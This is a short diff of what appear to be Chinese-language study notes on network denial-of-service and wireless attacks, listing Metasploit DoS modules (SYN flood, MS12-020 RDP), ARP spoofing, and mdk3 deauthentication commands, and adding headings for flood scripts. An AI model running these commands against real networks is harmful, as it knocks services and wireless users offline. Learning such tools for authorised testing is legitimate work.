@@ -6,6 +6,8 @@
 
 4应用层攻击 yersinia -G 2 metaspont  dos 相关模块 use auxiliary/dos/tcp/synflood
 use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
+sys_flood 脚本
+smurf 原理和sockstress 脚本
 
 
 ARP欺骗
@@ -27,7 +29,6 @@ a 表示DOS攻击  -a 攻击者指定的AP  -S 发送的速度
 mdk3 wlan d -c 1[,6,11] [-w file -b file]
 mdk3 wlan d -c 11
 
-232323
 
 
 
